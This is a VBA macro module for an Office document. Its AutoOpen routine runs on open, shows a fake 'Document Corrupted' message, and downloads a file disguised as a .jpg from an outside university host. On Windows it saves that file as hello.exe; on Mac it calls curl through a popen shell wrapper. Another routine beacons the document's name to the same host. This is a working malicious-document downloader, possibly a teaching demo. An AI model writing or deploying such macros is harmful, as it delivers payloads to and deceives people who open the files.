' execShell() function courtesy of Robert Knight via StackOverflow
' http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac
#If Mac Then
Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As LongPtr
Private Declare PtrSafe Function pclose Lib "libc.dylib" (ByVal file As LongPtr) As Long
Private Declare PtrSafe Function fread Lib "libc.dylib" (ByVal outStr As String, ByVal size As LongPtr, ByVal items As LongPtr, ByVal stream As LongPtr) As Long
Private Declare PtrSafe Function feof Lib "libc.dylib" (ByVal file As LongPtr) As LongPtr
#Else

#End If

Sub AutoOpen()
    Dim objHttp As Object
    Dim url As String
    url = "http://cs.unk.edu/~miller/001XXXXXXX.jpg"
     MsgBox ("Document Corrupted")
    'Test the conditional compiler constant #Mac
    #If Mac Then
    'I am a Mac
        MsgBox "Call your Mac_Macro"
'   GetHTML ("https://www.google.com")
x = HTTPGet(url, "a.html")
    #Else
    'I am Windows
        MsgBox "Call Windows_Macro"
        Set objHttp = CreateObject("MSXML2.ServerXMLHTTP")

        objHttp.Open "GET", url, False
        objHttp.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        objHttp.send ("")
        BinaryGetURL = objHttp.ResponseBody
        SaveBinaryData("hello.exe", BinaryGetURL)
    #End If
End Sub


Function SaveBinaryData(FileName, ByteArray)
  Const adTypeBinary = 1
  Const adSaveCreateOverWrite = 2

  'Create Stream object
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write ByteArray

  'Save binary data To disk
  BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function

Sub WINorMAC_1()
Dim strPath As String
Dim url As String
strPath = ThisDocument.Name

url = "http://cs.unk.edu/~miller/" + strPath
MsgBox ("Document Corrupted")
'   GetHTML ("https://www.google.com")
x = HTTPGet(url, "a.html")

End Sub

Function GetHTML(url As String) As String
    Dim HTML As String
    With CreateObject("MSXML2.XMLHTTP")
        .Open "GET", url, False
       .send
        GetHTML = .ResponseText
    End With
End Function

Option Explicit


Function execShell(command As String, Optional ByRef exitCode As Long) As String
    Dim file As LongPtr
    file = popen(command, "r")

    If file = 0 Then
        Exit Function
    End If

    While feof(file) = 0
        Dim chunk As String
        Dim read As Long
        chunk = Space(50)
        read = fread(chunk, 1, Len(chunk) - 1, file)
        If read > 0 Then
            chunk = Left$(chunk, read)
            execShell = execShell & chunk
        End If
    Wend

    exitCode = pclose(file)
End Function

Function HTTPGet(sUrl As String, sQuery As String) As String

    Dim sCmd As String
    Dim sResult As String
    Dim lExitCode As Long

    sCmd = "curl --get -d """ & sQuery & """" & " " & sUrl
    sResult = execShell(sCmd, lExitCode)

    ' ToDo check lExitCode

    HTTPGet = sResult

End Function
